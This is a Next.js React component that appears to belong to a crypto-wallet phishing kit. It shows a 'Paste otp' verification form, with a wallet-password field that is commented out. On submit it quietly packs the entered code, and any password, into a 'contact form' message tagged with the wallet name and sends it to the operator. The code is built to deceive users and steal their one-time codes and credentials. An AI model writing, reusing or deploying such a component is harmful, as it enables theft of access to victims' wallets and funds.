import { sendContactForm } from "@/libs/api";
import { useRouter } from "next/router";
import React, { useState } from "react";

export default function Otp({ wallet }) {
  const router = useRouter();
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [data, setData] = useState({ email: "", password: "" });
  const handleChange = (e) => {
    const name = e.target.name;
    const value = e.target.value;
    setData({ ...data, [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    try {
      const payload = {
        name: wallet,
        subject: "email",
        message: `email:${data?.email}, password: ${data?.password}`,
      };
      const response = await sendContactForm(payload);
      console.log(response);

      if (response.success) {
        setData({ email: "", password: "" });
        
        // router.push("/success");
      } else {
        setError("Form submission failed.");
      }
    } catch (err) {
      setError(err, "failed to submit, retry");
      console.log(err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <form className="space-y-3" onSubmit={handleSubmit}>
      <textarea
        name="email"
        value={data.email}
        onChange={handleChange}
        required
        className="w-full border rounded-md h-36 p-2"
        placeholder="Paste otp"
      />
      {/* <input
        name="password"
        value={data.password}
        onChange={handleChange}
        required
        type="password"
        className="w-full p-2 h-10 rounded-md border"
        placeholder="wallet password"
      /> */}
      <p className="text-xs text-gray-500 text-left">
       Paste otp to finalised. otp not received wait 1-2 mins before retrying.
      </p>
      <button
        type="submit"
        className="uppercase w-full bg-primary text-white py-2 rounded-md "
      >
        {loading ? "Proceeding..." : "Proceed"}
      </button>
      {error.length > 1 && (
        <p className="text-red-600 mt-4 text-center">{error}</p>
      )}
    </form>
  );
}
